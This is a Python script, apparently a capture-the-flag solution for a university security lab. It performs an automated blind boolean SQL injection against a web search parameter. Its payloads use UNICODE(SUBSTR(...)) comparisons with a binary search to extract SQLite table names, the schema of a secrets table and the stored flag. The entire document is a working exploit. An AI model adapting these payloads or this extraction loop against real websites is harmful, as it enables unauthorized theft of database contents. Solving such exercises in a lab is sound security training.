import requests
import urllib.parse

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262"

def get_table_name_query(n, n_char, search_char):
	return "' AND UNICODE(SUBSTR((select tbl_name from sqlite_master limit 1 offset {offset}),{index},1)) >= {char} --  ".format(offset = n, index = n_char, char= search_char )

def get_secret_schema_query(n, n_char, search_char):
	return "' AND UNICODE(SUBSTR((select sql from sqlite_master where tbl_name='super_s_sof_secrets'),{index},1)) >= {char} --  ".format(index = n_char, char= search_char )

def get_secret_content_query(n, n_char, search_char):
	return "' AND UNICODE(SUBSTR((select secret from super_s_sof_secrets),{index},1)) >= {char} --  ".format(offset = n, index = n_char, char= search_char)

def get_string(index, query):
	name = ""
	pos = 1
	available_chars = sorted([ord(i) for i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ \n\t{},()"])
	while True:
		ub = len(available_chars)
		lb = -1
		while ub > lb + 1:
			i = (lb + ub)//2
			response = s.get(link + "/?search=" + urllib.parse.quote(query(index, pos, available_chars[i])))

			if ("Found 0" in response.text):
				ub = i
			elif ("Found" in response.text):
				lb = i

		if lb == -1:
			break
		name += chr(available_chars[lb])
		pos += 1
	return name

s = requests.Session()

i = 1
print("---- Table names ----")
while True:
	name = get_string(i, get_table_name_query)
	if not name:
		break
	i += 1
	print(name)

print("---- Details of super_s_sof_secrets table ---") 
print(get_string(1, get_secret_schema_query))

print("---- Flag ----")
print(get_string(1, get_secret_content_query))
